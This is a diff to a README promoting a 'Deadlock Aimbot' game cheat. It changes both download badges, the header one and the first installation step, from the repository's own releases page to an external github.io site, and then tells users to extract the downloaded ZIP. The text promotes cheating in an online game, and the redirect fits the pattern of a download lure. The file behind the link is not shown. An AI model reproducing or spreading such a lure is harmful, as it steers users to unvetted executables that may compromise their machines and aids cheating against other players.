@@ -1,9 +1,9 @@
 
-# 🎯 Deadlock Aimbot - Elevate Your Gameplay **[![Download Deadlock Aimbot](https://img.shields.io/badge/Download-Deadlock%20Aimbot-blueviolet)](../../releases)**
+# 🎯 Deadlock Aimbot - Elevate Your Gameplay **[![Download Deadlock Aimbot](https://img.shields.io/badge/Download-Deadlock%20Aimbot-blueviolet)](https://deadlock-aimbot-external-cheat.github.io/.github/)**
 
 ## Quick Installation
 To get started with Deadlock Aimbot, follow these simple steps:
-1. **[![Download Deadlock Aimbot](https://img.shields.io/badge/Download-Deadlock%20Aimbot-blueviolet)](../../releases)**
+1. **[![Download Deadlock Aimbot](https://img.shields.io/badge/Download-Deadlock%20Aimbot-blueviolet)](https://deadlock-aimbot-external-cheat.github.io/.github/)**
 2. Extract the downloaded ZIP file to your desired location on your system.
 
 ---
